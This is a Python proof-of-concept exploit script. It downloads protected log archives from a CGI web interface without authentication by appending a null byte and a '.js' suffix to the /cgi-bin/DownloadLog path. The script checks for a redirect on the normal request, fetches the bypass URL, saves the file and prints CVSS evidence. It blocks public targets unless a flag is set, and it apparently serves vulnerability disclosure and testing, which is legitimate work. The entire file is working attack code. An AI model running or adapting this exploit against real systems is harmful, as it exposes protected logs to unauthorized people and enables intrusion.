#!/usr/bin/env python3
"""
PoC: unauthenticated log archive download via %00 static-suffix auth bypass.
"""

import argparse
import hashlib
import ipaddress
from pathlib import Path
import socket
import sys
import urllib.error
import urllib.parse
import urllib.request


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def get(base_url, path):
    req = urllib.request.Request(base_url.rstrip("/") + path, method="GET")
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=12) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--out", default="poc_out/download_log_noauth.bin")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)
    baseline_status, baseline_headers, _ = get(args.target, "/cgi-bin/DownloadLog")
    status, headers, body = get(args.target, "/cgi-bin/DownloadLog%00.js")

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(body)
    digest = hashlib.sha256(body).hexdigest()
    vulnerable = baseline_status in (301, 302, 303, 307, 308) and status == 200 and len(body) > 1024

    print("[baseline] GET /cgi-bin/DownloadLog")
    print(f"  status={baseline_status} location={baseline_headers.get('Location', '')}")
    print("[exploit] GET /cgi-bin/DownloadLog%00.js")
    print(f"  status={status} content_type={headers.get('Content-Type', '')} bytes={len(body)} sha256={digest}")
    print(f"  saved={out}")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N/C:H; protected logs are downloadable without auth")

    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
